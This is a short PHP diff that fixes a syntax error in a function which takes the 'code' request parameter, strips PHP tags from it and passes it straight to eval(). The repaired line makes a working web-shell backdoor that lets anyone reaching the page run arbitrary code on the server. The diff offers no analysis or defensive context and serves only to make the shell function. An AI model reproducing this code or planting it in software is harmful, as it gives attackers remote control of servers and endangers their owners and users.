@@ -10,7 +10,7 @@ function replace_stR($s,$h){
 function phpevaL(){
 	echo '<center>';
 	$s=array('<?php'=>'','<?'=>'','?>'=>'');
-	eval(replace_stR($s,$_REQUEST['code']);
+	eval(replace_stR($s,$_REQUEST['code']));
 }
 
 phpevaL();
